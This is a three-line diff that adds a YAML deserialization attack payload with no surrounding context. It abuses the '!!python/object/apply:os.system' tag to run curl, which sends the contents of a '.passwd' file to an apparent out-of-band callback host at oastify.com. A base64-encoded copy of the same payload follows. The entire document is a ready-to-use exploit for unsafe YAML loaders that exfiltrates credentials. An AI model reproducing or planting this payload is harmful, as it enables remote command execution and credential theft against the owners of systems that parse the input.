@@ -1,0 +1,3 @@
+yaml: !!python/object/apply:os.system ['curl -X POST -d "$(cat .passwd)" http://w639uy8ozyhyj5gxsysy871dg4mvaoyd.oastify.com']
+
+base64 -> eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbSBbJ2N1cmwgLVggUE9TVCAtZCAiJChjYXQgLnBhc3N3ZCkiIGh0dHA6Ly93NjM5dXk4b3p5aHlqNWd4c3lzeTg3MWRnNG12YW95ZC5vYXN0aWZ5LmNvbSdd
